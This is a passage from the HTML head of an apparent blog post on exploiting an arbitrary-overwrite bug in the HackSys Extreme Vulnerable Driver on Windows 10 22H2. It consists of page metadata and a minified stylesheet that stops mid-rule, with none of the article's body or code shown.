<!DOCTYPE html>
<html lang="en">

<head>

  <meta property="og:title" content="HEVD on Win10 22H2 - Arbitrary Overwrite" />
  <meta property="og:description" content="Exploiting arbitrary overwrites on modern windows 10 22H2 comes with a few mitigations you have to deal with. Lets take a look on how we can leverage an arbitrary overwrite vulnerability to gain privilege escalation." />
  <meta property="og:image" content="https://0dr3f.github.io/images/post_01.png" />
  <meta property="og:url" content="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:creator" content="@0Dr3f" />

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>HEVD on Win10 22H2 - Arbitrary Overwrite</title>
  <meta name='description' content='Exploiting arbitrary overwrites on modern windows 10 22H2 comes with a few mitigations you have to deal with. Lets take a look on how we can leverage an arbi...'>

  <link rel="canonical" href="/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">
  <link rel="alternate" type="application/rss+xml" title="0Dr3f" href="/feed.xml">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">

  <!-- Ionicons -->
  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">

  <style>
  
  /*!------------------------------------------------------------------
[MAIN STYLESHEET]
-------------------------------------------------------------------*/.block{display:block}.inline-block{display:inline-block}.inline{display:inline}.show{display:block}.hide{display:none}.invisible{visibility:hidden}.list-reset{list-style-type:none;margin:0;padding:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}/*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:rgba(0,0,0,0)}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:30px}ul,ol,dd{margin-left:20px}.highlight{border-radius:4px;color:#fff;background:#17151e;font-family:monospace;font-size:12px}.highlighter-rouge .highlight{background:#17151e}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#fff}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d85858}.highlight .na{color:teal}.highlight .nb{color:#0086b3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:teal}.highlight .ni{color:purple}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:#6565ff}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d85858}.highlight .sc{color:#d85858}.highlight .sd{color:#d85858}.highlight .s2{color:#d85858}.highlight .se{color:#d85858}.highlight .sh{color:#d85858}.highlight .si{color:#d85858}.highlight .sx{color:#d85858}.highlight .sr{color:#009926}.highlight .s1{color:#d85858}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}.container{max-width:1340px;padding-left:20px;padding-right:20px;margin:0 auto}.container-big{max-width:1600px;padding-left:20px;padding-right:20px;margin:0 auto}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-16px;margin-right:-16px}.col{padding-left:16px;padding-right:16px}[class^=col-]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media(max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media(max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media(max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media(max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media(max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media(max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media(max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media(max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media(max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}img[data-action=zoom]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:999;-webkit-transition:all 300ms;-o-transition:all 300ms;transition:all 300ms}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;background:#0f0e15;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;opacity:0;-webkit-transition:opacity 300ms;-o-transition:opacity 300ms;transition:opacity 300ms}@supports(-webkit-backdrop-filter: none) or (backdrop-filter: none){.zoom-overlay{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background:rgba(15,14,21,.8)}}.zoom-overlay-open .zoom-overlay{opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.animate{animation:animateElement cubic-bezier(0.3, 0.45, 0.45, 0.95) .75s;animation-duration:.75s;animation-iteration-count:1;transition:transform .2s}@keyframes animateElement{0%{opacity:0;transform:translate(0px, 50px)}100%{opacity:1;transform:translate(0px, 0px)}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:18px;line-height:1.7;color:#eee;background-color:#0f0e15;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;overflow-x:hidden}body.is-in::after{visibility:hidden;opacity:0;pointer-events:none}body::after{content:"";position:fixed;left:0;top:0;width:100%;height:100%;background-color:#09080f;z-index:999;transition:1s}body input,body textarea{border:1px solid #eee;outline:none}@media only screen and (max-width: 576px){body{font-size:16px;line-height:29px}}::placeholder{color:#aaa}*::selection{color:#fff;background-color:rgba(255,123,123,.7)}h1,h2,h3,h4,h5,h6{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-weight:900;line-height:1.4em;letter-spacing:-1px;color:#eee}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{position:relative;padding:34px 20px 34px 64px;margin-bottom:0;font-size:28px;line-height:36px;font-weight:900;color:#fff}blockquote:before{content:"“";position:absolute;top:.59em;left:-0.01em;font-size:4em;color:#ff7b7b}blockquote p{margin-bottom:20px}blockquote cite{font-size:16px;font-style:normal;font-weight:700;color:#eee}blockquote cite:before{content:"—" " "}@media only screen and (max-width: 576px){blockquote{padding:20px 20px 20px 48px;font-size:20px;line-height:28px}}pre{overflow:auto;padding:20px;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}code[class*=language-],pre[class*=language-]{white-space:pre-wrap;word-break:break-all;line-height:inherit}img,.zoom-img-wrap{max-width:100%;height:auto;vertical-align:middle}img+em,.zoom-img-wrap+em{display:inline-block;width:100%;padding:20px 0 0;font-size:12px;font-style:normal;line-height:1;text-align:center;color:#eee}a{text-decoration:none;color:#eee;transition:all .2s}a:hover{color:#ff7b7b}hr{display:block;width:100%;height:1px;margin:64px 0;border:0;background:#09080f}.table-container{display:block;max-width:100%;overflow-x:auto}table{font-size:12px;color:rgba(238,238,238,.7);width:100%;border-width:1px;border-color:#09080f;border-collapse:collapse}table th{padding:12px;font-size:16px;text-align:left;border:1px solid #09080f;color:#fff;background-color:#17151e}table tr{background-color:#09080f;transition:all .3s ease}table tr:nth-child(even){background-color:rgba(0,0,0,0)}table td{padding:12px;font-size:14px;border:1px solid #09080f}table tr:hover{color:#fff}.gallery-box{margin-bottom:30px}.gallery-box em{display:inline-block;width:100%;padding:20px 0 0;font-size:12px;font-style:normal;line-height:1;text-align:center;color:#eee}.gallery-box em a{border-bottom:2px solid rgba(238,238,238,.1)}.gallery-box em a:hover{border-color:#ff7b7b;color:#eee;text-decoration:none}.gallery{display:grid;grid-template-columns:repeat(3, auto);justify-content:center;align-content:center;grid-gap:10px}.gallery img{width:100%;height:auto}.lazy{opacity:0;transition:.4s ease}.lazy.loaded{opacity:1}.hero{position:relative;margin-bottom:32px;overflow:hidden;background-color:#09080f}@media only screen and (max-width: 576px){.hero{box-shadow:none}}.hero__inner::before{content:"";display:block;position:absolute;top:0;bottom:0;left:0;right:0;z-index:1;background:linear-gradient(180deg, rgba(15, 14, 21, 0.5) 0%, #0f0e15 100%)}.hero__image{min-height:664px;user-select:none;background-color:#09080f}.hero__image img{position:absolute;top:0px;width:100%;height:100%;object-fit:cover}@media only screen and (max-width: 992px){.hero__image{min-height:620px}}@media only screen and (max-width: 768px){.hero__image{min-height:500px}}@media only screen and (max-width: 576px){.hero__image{min-height:400px}}.hero__content{position:absolute;top:50%;left:50%;transform:translate(-50%, -50%);z-index:1;width:100%;max-width:650px;padding:0 20px;text-align:center}.hero__title{font-size:60px;margin:0 0 10px;line-height:1;color:#fff}@media only screen and (max-width: 576px){.hero__title{font-size:43px;margin:0 0 5px}}.hero__desc{font-size:20px;color:#aaa;margin:0}@media only screen and (max-width: 576px){.hero__desc{font-size:16px;line-height:21px}}.hero-without-image{margin:192px 0 96px}.hero-without-image .hero-inner{display:flex;align-items:center;justify-content:center}.hero-without-image .hero-content{width:100%;max-width:650px;padding:0 20px;text-align:center}@media only screen and (max-width: 576px){.hero-without-image{margin:144px 0 48px}}.top{position:fixed;bottom:25px;right:-100px;z-index:5;width:40px;height:40px;line-height:40px;text-align:center;border-radius:8px;background-color:#09080f;color:#fff;cursor:pointer;transition:all .25s ease}.top:hover{color:#09080f;background:#ff7b7b}.top.is-active{right:30px}@media only screen and (max-width: 768px){.top{bottom:15px}.top.is-active{right:25px}}.header{width:100%;margin:60px 0;transition:all .2s;color:#fff}.header.header--top{position:absolute;top:0;z-index:100}@media only screen and (max-width: 992px){.header{margin:32px 0}}.header__inner{position:relative;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}.logo__link{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:28px;line-height:1;font-weight:900;vertical-align:middle;color:#eee;text-transform:uppercase;text-decoration:none;letter-spacing:-1px}.logo__link:hover{color:#ff7b7b}.logo__image{max-height:40px}.main-nav{width:100%;max-width:1300px;margin:0 auto}.main-nav__box{display:flex;align-items:center;width:80%;padding-top:200px;margin:0 auto}.main-nav__box .nav__icon-close{position:absolute;top:20px;right:40px;z-index:5;display:flex;align-items:center;justify-content:center;font-size:30px;width:40px;height:40px;text-align:center;line-height:40px;color:rgba(255,255,255,.5);transition:all .25s ease;cursor:pointer}.main-nav__box .nav__icon-close:hover{color:#fff}@media only screen and (max-width: 768px){.main-nav__box{padding-top:100px}.main-nav__box .nav__icon-close{top:22px;right:42px}}@media only screen and (max-width: 576px){.main-nav__box{width:90%}}.navigation{display:flex;align-items:center}.top-nav .nav__list .nav__item{display:inline-block;margin-right:40px}.top-nav .nav__list .nav__item:last-child{margin-right:0}.top-nav .nav__list .nav__item .nav__link{position:relative;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;text-decoration:none;color:#eee}.top-nav .nav__list .nav__item .nav__link:hover{color:#ff7b7b}@media only screen and (max-width: 992px){.top-nav{display:none}}.mobile-nav .nav__list .nav__item{display:block;margin-bottom:36px;text-align:center}.mobile-nav .nav__list .nav__item:last-child{margin-bottom:0}.mobile-nav .nav__list .nav__item .nav__link{position:relative;font-size:18px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:#eee}.mobile-nav .nav__list .nav__item .nav__link:hover{color:#ff7b7b}@media only screen and (max-width: 576px){.mobile-nav .nav__list .nav__item{margin-bottom:28px}}.nav-buttons{display:flex;align-items:center;font-size:24px;color:#eee}.nav-buttons .search-button{display:flex;align-items:center;cursor:pointer;transition:all .2s}.nav-buttons .search-button span{transition:all .2s}.nav-buttons .search-button:hover span{color:#ff7b7b}.nav-buttons .search-button span{display:block;margin-left:8px;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase}@media only screen and (max-width: 992px){.nav-buttons .search-button span{display:none}}.nav-buttons .nav__icon-menu{display:none;margin-right:16px}@media only screen and (max-width: 992px){.nav-buttons .nav__icon-menu{display:block}}.nav-buttons .nav__icon{cursor:pointer}.menu-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:100;opacity:0;visibility:hidden;background-color:#09080f;transition:all .5s ease-in-out}.menu-overlay.is-open{opacity:1;visibility:visible}@supports(-webkit-backdrop-filter: none) or (backdrop-filter: none){.menu-overlay{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background-color:rgba(9,8,15,.9)}}@media only screen and (min-width: 992px){.menu-overlay{display:none}}.nav-grid{width:100%;height:75vh;overflow-y:auto}.nav-grid__item{margin-bottom:30px}@media only screen and (max-width: 768px){.nav-grid__item{height:auto}}.nav-grid__title{position:relative;margin-bottom:48px;padding-bottom:15px;font-size:40px;text-align:center;color:#eee}.nav-grid__title::after{content:"";position:absolute;left:50%;bottom:0;transform:translate(-50%, -50%);display:block;width:25px;height:2px;background-color:#fff}@media only screen and (max-width: 768px){.nav-grid__title{margin-bottom:30px}}.search{position:fixed;top:0;left:0;right:0;bottom:0;z-index:100;overflow:auto;opacity:0;visibility:hidden;background-color:#09080f;transition:all .5s ease-in-out}.search.is-visible{opacity:1;visibility:visible}@supports(-webkit-backdrop-filter: none) or (backdrop-filter: none){.search{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background-color:rgba(9,8,15,.9)}}.search__box{position:relative;max-width:540px;width:100%;margin:0 auto;padding-top:140px}.search__box .search__close{position:absolute;top:50%;right:24px;transform:translateY(-50%);font-size:30px;line-height:1;color:rgba(238,238,238,.5);transition:all .25s;cursor:pointer}.search__box .search__close:hover{color:#eee}@media only screen and (max-width: 768px){.search__box{width:80%;padding-top:100px}}@media only screen and (max-width: 576px){.search__box{width:90%}}.search__group{position:relative;margin-bottom:64px}.search__group .search__text{width:100%;height:auto;padding:16px 24px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica 